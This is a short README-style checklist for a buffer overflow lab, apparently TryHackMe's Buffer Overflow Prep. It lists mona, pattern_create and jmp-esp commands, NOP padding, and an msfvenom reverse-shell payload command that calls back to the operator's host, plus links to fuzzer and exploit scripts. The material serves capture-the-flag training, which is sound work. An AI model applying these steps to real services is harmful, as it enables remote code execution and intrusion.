# How to use it

1 - Mona Configuration
\
`!mona config -set workingfolder c:\mona\%p` (Configure mona)

2 - Fuzzer payload
\
https://github.com/Lunox-code/TryHackMe-BufferOverflowPrep/blob/main/fuzzing.py

3 - Crash Replication & Controlling EIP
\
`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600` (Change the -l value to the value that crashed the server)
\
Then use Exploit payload:
\
https://github.com/Lunox-code/TryHackMe-BufferOverflowPrep/blob/main/exploit.py

4 - Search Offset
\
`!mona findmsp -distance 600` (Change the -l value to the value that crashed the server to find the EIP)
\
Then, update the exploit and set the offset variable. to the previews value and set retn to "BBBB"

5 - Finding bad characters
\
`!mona bytearray -b "\x00"`
\
then use badcharacter payload
\
https://github.com/Lunox-code/TryHackMe-BufferOverflowPrep/blob/main/badcharacters.py
\
`!mona compare -f C:\mona\oscp\bytearray.bin -a <address>` (Address EIP)
\
and try to find the badcharacters

********************

6 - Find a Jump Point
\
METHOD 1
\
Use dump on ESP
\
or
\
METHOD 2
\
`!mona jmp -r esp -cpb "\x00"`
\
Find a jump point (Search de addres to set on the exploit in the part of "retn")
********************

7 - Prepend NOPs
\
`padding = "\x90" * 16`

8 - Create Shell
\
`msfvenom -p windows/shell_reverse_tcp LHOST=tun0IPHERE LPORT=4444 EXITFUNC=thread -b "\x00" -f c`

9 - Netcat listener

10 - exploit!
